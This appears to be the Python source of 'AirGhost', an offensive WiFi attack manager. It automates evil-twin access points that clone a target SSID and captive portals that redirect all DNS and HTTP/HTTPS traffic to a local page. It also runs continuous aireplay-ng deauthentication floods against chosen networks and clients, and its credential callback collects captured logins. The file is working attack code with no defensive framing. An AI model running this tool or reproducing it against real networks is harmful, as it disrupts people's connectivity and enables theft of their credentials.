#!/usr/bin/env python3
#
# AirGhost Attack Manager
# Handles the execution and management of various WiFi attacks
#

import os
import sys
import time
import signal
import logging
import subprocess
import shutil
import json
import re
from threading import Thread, Event

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/opt/airghost/logs/attack_manager.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('attack_manager')

# Configuration paths
CONFIG_DIR = '/opt/airghost/config'
TEMPLATES_DIR = '/opt/airghost/templates'

# Global variables for tracking attack processes
running_attacks = {}
stop_events = {}

class AttackManager:
    def __init__(self):
        self.interfaces = {}
        self.attack_processes = {}
        self.capture_thread = None
        self.credential_callback = None
    
    def set_credential_callback(self, callback):
        """Set callback for captured credentials"""
        self.credential_callback = callback
    
    def update_interfaces(self, interfaces):
        """Update available interfaces"""
        self.interfaces = interfaces
    
    def prepare_interface(self, interface, mode='monitor'):
        """Prepare an interface for attack (monitor or AP mode)"""
        try:
            # Kill processes that might interfere
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Set interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Set mode
            if mode == 'monitor':
                subprocess.run(['iw', interface, 'set', 'monitor', 'none'], 
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                # AP mode will be managed by hostapd
                subprocess.run(['iw', interface, 'set', 'type', 'managed'], 
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Set interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            logger.info(f"Interface {interface} prepared in {mode} mode")
            return True
        except Exception as e:
            logger.error(f"Error preparing interface {interface}: {e}")
            return False
    
    def reset_interface(self, interface):
        """Reset interface to managed mode"""
        try:
            # Set interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Set mode to managed
            subprocess.run(['iw', interface, 'set', 'type', 'managed'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Set interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            logger.info(f"Interface {interface} reset to managed mode")
            return True
        except Exception as e:
            logger.error(f"Error resetting interface {interface}: {e}")
            return False
    
    def start_evil_twin(self, params):
        """Start an Evil Twin attack"""
        attack_id = 'evil_twin'
        
        try:
            interface = params.get('interface')
            ssid = params.get('ssid')
            channel = params.get('channel', '1')
            security = params.get('security', False)
            password = params.get('password', '')
            
            if not interface or not ssid:
                return False, "Missing required parameters (interface or SSID)"
            
            # Create hostapd config
            hostapd_conf = os.path.join(CONFIG_DIR, 'hostapd_evil_twin.conf')
            
            with open(hostapd_conf, 'w') as f:
                f.write(f"interface={interface}\n")
                f.write(f"driver=nl80211\n")
                f.write(f"ssid={ssid}\n")
                f.write(f"hw_mode=g\n")
                f.write(f"channel={channel}\n")
                f.write(f"macaddr_acl=0\n")
                f.write(f"ignore_broadcast_ssid=0\n")
                
                if security and password and len(password) >= 8:
                    f.write(f"auth_algs=1\n")
                    f.write(f"wpa=2\n")
                    f.write(f"wpa_passphrase={password}\n")
                    f.write(f"wpa_key_mgmt=WPA-PSK\n")
                    f.write(f"wpa_pairwise=TKIP\n")
                    f.write(f"rsn_pairwise=CCMP\n")
            
            # Prepare interface
            self.prepare_interface(interface, mode='ap')
            
            # Configure IP address for interface
            subprocess.run(['ip', 'addr', 'flush', 'dev', interface], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(['ip', 'addr', 'add', '192.168.1.1/24', 'dev', interface], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Start hostapd
            hostapd_cmd = ['hostapd', hostapd_conf]
            process = subprocess.Popen(hostapd_cmd, 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
            
            # Store process
            running_attacks[attack_id] = {
                'process': process,
                'cmd': ' '.join(hostapd_cmd),
                'interface': interface,
                'start_time': time.time(),
                'params': params
            }
            
            # Check if process started successfully
            time.sleep(2)
            if process.poll() is not None:
                # Process failed
                stderr = process.stderr.read().decode('utf-8')
                logger.error(f"Evil Twin attack failed: {stderr}")
                return False, f"Evil Twin attack failed: {stderr}"
            
            logger.info(f"Evil Twin attack started: {ssid} on channel {channel}")
            
            # If deauth is requested and we have a target BSSID, start deauth attack
            if params.get('deauth') and params.get('bssid'):
                # Use a separate thread for deauth to avoid blocking
                deauth_thread = Thread(
                    target=self.start_deauth,
                    args=({
                        'interface': interface + 'mon',  # Typically we'd use a second interface in monitor mode
                        'bssid': params.get('bssid'),
                        'count': '0'  # Continuous deauth
                    },)
                )
                deauth_thread.daemon = True
                deauth_thread.start()
            
            return True, "Evil Twin attack started"
        
        except Exception as e:
            logger.error(f"Error starting Evil Twin attack: {e}")
            return False, str(e)
    
    def start_captive_portal(self, params):
        """Start a Captive Portal attack"""
        attack_id = 'captive_portal'
        
        try:
            interface = params.get('interface')
            ssid = params.get('ssid')
            template = params.get('template', 'default')
            channel = params.get('channel', '1')
            
            if not interface or not ssid:
                return False, "Missing required parameters (interface or SSID)"
            
            # First, start the evil twin AP
            evil_twin_params = {
                'interface': interface,
                'ssid': ssid,
                'channel': channel,
                'security': False  # No security for captive portal
            }
            
            success, message = self.start_evil_twin(evil_twin_params)
            if not success:
                return False, f"Failed to start Evil Twin AP: {message}"
            
            # Create dnsmasq config
            dnsmasq_conf = os.path.join(CONFIG_DIR, 'dnsmasq_captive.conf')
            
            with open(dnsmasq_conf, 'w') as f:
                f.write(f"interface={interface}\n")
                f.write(f"dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h\n")
                f.write(f"dhcp-option=3,192.168.1.1\n")  # Default gateway
                f.write(f"dhcp-option=6,192.168.1.1\n")  # DNS server
                f.write(f"address=/#/192.168.1.1\n")     # Redirect all DNS queries to our server
                f.write(f"server=8.8.8.8\n")             # Upstream DNS
                f.write(f"log-queries\n")
                f.write(f"log-dhcp\n")
                f.write(f"no-resolv\n")
                f.write(f"no-hosts\n")
            
            # Start dnsmasq
            dnsmasq_cmd = ['dnsmasq', '-C', dnsmasq_conf, '--no-daemon']
            process = subprocess.Popen(dnsmasq_cmd, 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
            
            # Store process
            running_attacks[attack_id] = {
                'process': process,
                'cmd': ' '.join(dnsmasq_cmd),
                'interface': interface,
                'start_time': time.time(),
                'params': params
            }
            
            # Check if process started successfully
            time.sleep(2)
            if process.poll() is not None:
                # Process failed
                stderr = process.stderr.read().decode('utf-8')
                logger.error(f"Captive Portal attack failed: {stderr}")
                return False, f"Captive Portal attack failed: {stderr}"
            
            logger.info(f"Captive Portal attack started: {ssid} using {template} template")
            
            # Set up iptables to redirect HTTP(S) traffic to our web server
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', interface, 
                           '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '8080'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', interface, 
                           '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '8080'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # If deauth is requested and we have a target BSSID, start deauth attack
            if params.get('deauth') and params.get('bssid'):
                # Use a separate thread for deauth to avoid blocking
                deauth_thread = Thread(
                    target=self.start_deauth,
                    args=({
                        'interface': interface + 'mon',  # Typically we'd use a second interface in monitor mode
                        'bssid': params.get('bssid'),
                        'count': '0'  # Continuous deauth
                    },)
                )
                deauth_thread.daemon = True
                deauth_thread.start()
            
            return True, "Captive Portal attack started"
        
        except Exception as e:
            logger.error(f"Error starting Captive Portal attack: {e}")
            return False, str(e)
    
    def start_deauth(self, params):
        """Start a Deauthentication attack"""
        attack_id = 'deauth'
        
        try:
            interface = params.get('interface')
            bssid = params.get('bssid')
            client = params.get('client', '')
            count = params.get('count', '0')
            
            if not interface or not bssid:
                return False, "Missing required parameters (interface or BSSID)"
            
            # Prepare interface for monitor mode
            self.prepare_interface(interface, mode='monitor')
            
            # Build command
            deauth_cmd = ['aireplay-ng', '--deauth', count, '-a', bssid]
            
            # Add client if specified
            if client:
                deauth_cmd.extend(['-c', client])
            
            # Add interface
            deauth_cmd.append(interface)
            
            # Start process
            process = subprocess.Popen(deauth_cmd, 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
            
            # Store process
            running_attacks[attack_id] = {
                'process': process,
                'cmd': ' '.join(deauth_cmd),
                'interface': interface,
                'start_time': time.time(),
                'params': params
            }
            
            logger.info(f"Deauthentication attack started: target BSSID {bssid}")
            return True, "Deauthentication attack started"
        
        except Exception as e:
            logger.error(f"Error starting Deauthentication attack: {e}")
            return False, str(e)
    
    def stop_attack(self, attack_id):
        """Stop a running attack"""
        try:
            if attack_id not in running_attacks or not running_attacks[attack_id]['process']:
                return False, "Attack not running"
            
            attack = running_attacks[attack_id]
            process = attack['process']
            interface = attack['interface']
            
            # Kill the process if it's still running
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=5)
                if process.poll() is None:
                    process.kill()
            
            # Reset interface if needed
            if attack_id in ['evil_twin', 'captive_portal']:
                # Clean up iptables rules
                subprocess.run(['iptables', '-t', 'nat', '-F'], 
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Reset interface
                self.reset_interface(interface)
            
            # Clear attack info
            running_attacks[attack_id] = {
                'process': None,
                'cmd': '',
                'interface': '',
                'start_time': 0,
                'params': {}
            }
            
            logger.info(f"Attack {attack_id} stopped")
            return True, f"Attack {attack_id} stopped"
        
        except Exception as e:
            logger.error(f"Error stopping attack {attack_id}: {e}")
            return False, str(e)
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        for attack_id in list(running_attacks.keys()):
            self.stop_attack(attack_id)
    
    def process_credential(self, credential):
        """Process captured credential and pass to callback"""
        if self.credential_callback:
            self.credential_callback(credential)

# Global attack manager instance
attack_manager = AttackManager()

def signal_handler(sig, frame):
    """Handle signals for graceful shutdown"""
    logger.info("Shutdown signal received")
    attack_manager.stop_all_attacks()
    sys.exit(0)

if __name__ == "__main__":
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    logger.info("Attack Manager started")
    
    # Keep the script running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received")
        attack_manager.stop_all_attacks()
        sys.exit(0)
